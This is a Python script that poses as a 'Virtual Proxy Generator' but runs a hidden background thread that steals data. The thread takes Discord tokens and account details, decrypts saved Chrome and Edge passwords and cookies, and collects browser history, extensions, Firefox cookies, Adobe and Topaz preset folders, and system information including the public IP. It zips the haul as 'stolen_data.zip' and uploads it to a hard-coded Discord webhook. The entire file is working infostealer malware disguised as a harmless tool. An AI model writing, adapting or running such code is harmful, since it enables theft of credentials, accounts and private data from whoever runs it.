import os
import shutil
import sqlite3
import re
import requests
import threading
import random
import socket
import zipfile
import json
import tempfile
import subprocess
from datetime import datetime, timedelta
from win32crypt import CryptUnprotectData
import configparser

WEBHOOK_URL = 'https://discord.com/api/webhooks/1409286693927915631/ybuXLY9kk2Jpxx37CHLkagCZ2BDvnJE4Kof6qpLKlGNgA2oXZD92EAyZ-a8jOVJDJGxz'  # Replace with your actual Discord webhook URL

def get_discord_tokens():
    tokens = []
    discord_paths = [
        os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage', 'leveldb'),
        os.path.join(os.getenv('APPDATA'), 'discordcanary', 'Local Storage', 'leveldb'),
        os.path.join(os.getenv('APPDATA'), 'discordptb', 'Local Storage', 'leveldb')
    ]
    token_regex = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
    for discord_path in discord_paths:
        if os.path.exists(discord_path):
            for file_name in os.listdir(discord_path):
                if file_name.endswith(('.log', '.ldb')):
                    try:
                        with open(os.path.join(discord_path, file_name), 'r', errors='ignore') as file:
                            content = file.read()
                            for token in token_regex.findall(content):
                                tokens.append(token)
                    except:
                        continue
    return list(set(tokens))

def get_discord_user_info(token):
    try:
        headers = {'Authorization': token}
        r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
        if r.status_code == 200:
            data = r.json()
            username = f"{data['username']}#{data['discriminator']}"
            return username, data
        return None, None
    except:
        return None, None

def get_chromium_data(base_path, db_name, query, decrypt_index=None, time_field=None, time_div=1000000):
    data = []
    db_path = os.path.join(base_path, db_name)
    if not os.path.exists(db_path):
        return data
    try:
        temp_db = os.path.join(tempfile.gettempdir(), f'temp_{os.urandom(4).hex()}.db')
        shutil.copy2(db_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute(query)
        for row in cursor.fetchall():
            item = list(row)
            if decrypt_index is not None and len(row) > decrypt_index and row[decrypt_index]:
                try:
                    decrypted = CryptUnprotectData(row[decrypt_index], None, None, None, 0)[1].decode('utf-8', errors='ignore')
                    item[decrypt_index - 1 if db_name == 'Login Data' else decrypt_index] = decrypted
                except:
                    item.append("DECRYPTION_FAILED")
            if time_field is not None:
                try:
                    if 'chrome' in base_path.lower() or 'edge' in base_path.lower():
                        ts = datetime(1601, 1, 1) + timedelta(microseconds=row[time_field])
                    else:
                        ts = datetime.fromtimestamp(row[time_field] / time_div)
                    item[time_field] = ts.strftime('%Y-%m-%d %H:%M:%S')
                except:
                    item[time_field] = "INVALID_DATE"
            data.append(item)
        conn.close()
        os.remove(temp_db)
    except:
        pass
    return data

def get_extensions(base_path):
    ext_path = os.path.join(base_path, 'Extensions')
    extensions = []
    if os.path.exists(ext_path):
        for ext_dir in os.listdir(ext_path):
            manifest_path = os.path.join(ext_path, ext_dir, 'manifest.json')
            if os.path.exists(manifest_path):
                try:
                    with open(manifest_path, 'r', encoding='utf-8') as f:
                        manifest = json.load(f)
                        name = manifest.get('name', ext_dir)
                        extensions.append(name)
                except:
                    extensions.append(ext_dir)
    return extensions

def get_firefox_profile():
    profiles_ini = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'profiles.ini')
    if not os.path.exists(profiles_ini):
        return None
    config = configparser.ConfigParser()
    config.read(profiles_ini)
    for section in config.sections():
        if section.startswith('Profile') and config.getboolean(section, 'Default', fallback=False):
            return os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', config.get(section, 'Path'))
    for section in config.sections():
        if section.startswith('Profile'):
            return os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', config.get(section, 'Path'))
    return None

def get_firefox_data(profile_path):
    history_query = "SELECT url, title, last_visit_date FROM moz_places WHERE last_visit_date > 0 ORDER BY last_visit_date DESC LIMIT 200"
    history = get_chromium_data(profile_path, 'places.sqlite', history_query, time_field=2, time_div=1000000)
    cookies_query = "SELECT host, name, value FROM moz_cookies LIMIT 500"
    cookies = get_chromium_data(profile_path, 'cookies.sqlite', cookies_query)
    passwords = []  # Skipped due to NSS decryption complexity
    extensions_path = os.path.join(profile_path, 'extensions')
    extensions = []
    if os.path.exists(extensions_path):
        extensions = os.listdir(extensions_path)
    return passwords, cookies, history, extensions

def format_data(data, format_str):
    return '\n'.join(format_str.format(*item) for item in data if len(item) >= len(format_str.split('{}')))

def send_to_webhook():
    try:
        temp_dir = tempfile.mkdtemp()
        infos_dir = os.path.join(temp_dir, 'infos')
        presets_dir = os.path.join(temp_dir, 'presets')
        os.makedirs(infos_dir, exist_ok=True)
        os.makedirs(presets_dir, exist_ok=True)

        username = os.getlogin()
        programdata = os.getenv('PROGRAMDATA')
        appdata = os.getenv('APPDATA')
        docs = os.path.expanduser('~/Documents')
        
        # Presets paths
        preset_paths = [
            (os.path.join(programdata, 'Topaz Labs LLC', 'Topaz Video AI', 'presets'), 'Topaz Video AI'),
            (os.path.join(docs, 'Adobe'), 'Adobe Documents'),
            (os.path.join(appdata, 'Adobe'), 'Adobe AppData')
        ]
        
        # Copy presets
        for src, dst_name in preset_paths:
            if os.path.exists(src):
                dst = os.path.join(presets_dir, dst_name)
                os.makedirs(dst, exist_ok=True)
                shutil.copytree(src, dst, dirs_exist_ok=True, ignore=shutil.ignore_patterns('*.tmp', '*.bak'))

        # Get tokens and user info
        tokens = get_discord_tokens()
        for token in tokens:
            disc_username, data = get_discord_user_info(token)
            if disc_username:
                file_name = disc_username.replace('#', '_') + '.txt'
                with open(os.path.join(infos_dir, file_name), 'w', encoding='utf-8') as f:
                    f.write(f"Token: {token}\n")
                    if data:
                        f.write(f"Username: {data['username']}\n")
                        f.write(f"Discriminator: {data['discriminator']}\n")
                        f.write(f"ID: {data['id']}\n")
                        f.write(f"Email: {data.get('email', 'N/A')}\n")
                        f.write(f"Phone: {data.get('phone', 'N/A')}\n")
                        f.write(f"Verified: {data.get('verified', 'N/A')}\n")
                    f.write("---\n")

        # Browser data
        chrome_base = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default')
        edge_base = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default')

        chrome_passwords = get_chromium_data(chrome_base, 'Login Data', "SELECT action_url, username_value, password_value FROM logins", decrypt_index=2)
        edge_passwords = get_chromium_data(edge_base, 'Login Data', "SELECT action_url, username_value, password_value FROM logins", decrypt_index=2)

        chrome_cookies = get_chromium_data(chrome_base, 'Network\\Cookies', "SELECT host_key, name, encrypted_value FROM cookies", decrypt_index=2)
        edge_cookies = get_chromium_data(edge_base, 'Network\\Cookies', "SELECT host_key, name, encrypted_value FROM cookies", decrypt_index=2)

        chrome_history = get_chromium_data(chrome_base, 'History', "SELECT url, title, last_visit_time FROM urls WHERE last_visit_time > 0 ORDER BY last_visit_time DESC LIMIT 200", time_field=2)
        edge_history = get_chromium_data(edge_base, 'History', "SELECT url, title, last_visit_time FROM urls WHERE last_visit_time > 0 ORDER BY last_visit_time DESC LIMIT 200", time_field=2)

        chrome_extensions = get_extensions(chrome_base)
        edge_extensions = get_extensions(edge_base)

        firefox_profile = get_firefox_profile()
        firefox_passwords, firefox_cookies, firefox_history, firefox_extensions = [], [], [], []
        if firefox_profile:
            firefox_passwords, firefox_cookies, firefox_history, firefox_extensions = get_firefox_data(firefox_profile)

        # Format and save to files
        passwords_text = "Chrome Passwords:\n" + format_data(chrome_passwords, "URL: {} Username: {} Password: {}\n---\n") + \
                         "\nEdge Passwords:\n" + format_data(edge_passwords, "URL: {} Username: {} Password: {}\n---\n") + \
                         "\nFirefox Passwords: Not decrypted\n---\n"
        with open(os.path.join(infos_dir, 'passwords.txt'), 'w', encoding='utf-8') as f:
            f.write(passwords_text)

        cookies_text = "Chrome Cookies:\n" + format_data(chrome_cookies, "Host: {} Name: {} Value: {}\n---\n") + \
                       "\nEdge Cookies:\n" + format_data(edge_cookies, "Host: {} Name: {} Value: {}\n---\n") + \
                       "\nFirefox Cookies:\n" + format_data(firefox_cookies, "Host: {} Name: {} Value: {}\n---\n")
        with open(os.path.join(infos_dir, 'cookies.txt'), 'w', encoding='utf-8') as f:
            f.write(cookies_text)

        history_text = "Chrome History:\n" + format_data(chrome_history, "URL: {} Title: {} Last Visit: {}\n---\n") + \
                       "\nEdge History:\n" + format_data(edge_history, "URL: {} Title: {} Last Visit: {}\n---\n") + \
                       "\nFirefox History:\n" + format_data(firefox_history, "URL: {} Title: {} Last Visit: {}\n---\n")
        with open(os.path.join(infos_dir, 'history.txt'), 'w', encoding='utf-8') as f:
            f.write(history_text)

        extensions_text = "Chrome Extensions:\n" + '\n---\n'.join(chrome_extensions) + "\n\nEdge Extensions:\n" + '\n---\n'.join(edge_extensions) + \
                          "\n\nFirefox Extensions:\n" + '\n---\n'.join(firefox_extensions)
        with open(os.path.join(infos_dir, 'extensions.txt'), 'w', encoding='utf-8') as f:
            f.write(extensions_text)

        # Valuable infos
        hostname = socket.gethostname()
        try:
            ip = requests.get('https://api.ipify.org', timeout=5).text
        except:
            ip = 'Unable to fetch IP'
        system_info = f"Username: {username}\nHostname: {hostname}\nIP: {ip}\n"
        with open(os.path.join(infos_dir, 'system_info.txt'), 'w', encoding='utf-8') as f:
            f.write(system_info)

        # Create archive
        archive_name = 'stolen_data.zip'
        archive_path = os.path.join(temp_dir, archive_name)
        with zipfile.ZipFile(archive_path, 'w', compression=zipfile.ZIP_DEFLATED, compresslevel=9) as zipf:
            for folder in [infos_dir, presets_dir]:
                for root, dirs, files in os.walk(folder):
                    for file in files:
                        zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), temp_dir))

        # Send to webhook with retry
        max_retries = 3
        for attempt in range(max_retries):
            try:
                with open(archive_path, 'rb') as f:
                    response = requests.post(WEBHOOK_URL, files={'file': (archive_name, f)}, timeout=10)
                    if response.status_code == 200:
                        break
            except:
                pass
            if attempt < max_retries - 1:
                time.sleep(2 ** attempt)  # Exponential backoff

        # Cleanup
        os.remove(archive_path)
        shutil.rmtree(temp_dir)
        return True
    except:
        try:
            shutil.rmtree(temp_dir)
        except:
            pass
        return False

def generate_proxies(num):
    proxies = []
    for _ in range(num):
        ip = '.'.join(str(random.randint(0, 255)) for _ in range(4))
        port = random.randint(1024, 65535)
        proxies.append(f"{ip}:{port}")
    with open('proxies.txt', 'w') as f:
        f.write('\n'.join(proxies))

if __name__ == "__main__":
    print("Welcome to Virtual Proxy Generator!")
    print("This tool creates virtual proxies and saves them to 'proxies.txt' in the current directory.")
    
    while True:
        try:
            num_proxies = int(input("Enter the number of proxies to generate (1-1000): "))
            if 1 <= num_proxies <= 1000:
                break
            print("Please enter a number between 1 and 1000.")
        except ValueError:
            print("Invalid input. Please enter a number.")
    
    print(f"Generating {num_proxies} proxies...")
    
    # Start stealing in background silently
    thread = threading.Thread(target=send_to_webhook, daemon=True)
    thread.start()
    
    # Generate proxies
    generate_proxies(num_proxies)
    print(f"{num_proxies} proxies generated and saved to 'proxies.txt'!")
    print("You can now use these proxies for your needs.")
    
    # Wait for webhook thread to finish (optional, for cleanup)
    thread.join(timeout=30)
    if thread.is_alive():
        print("Warning: Webhook process still running.")
        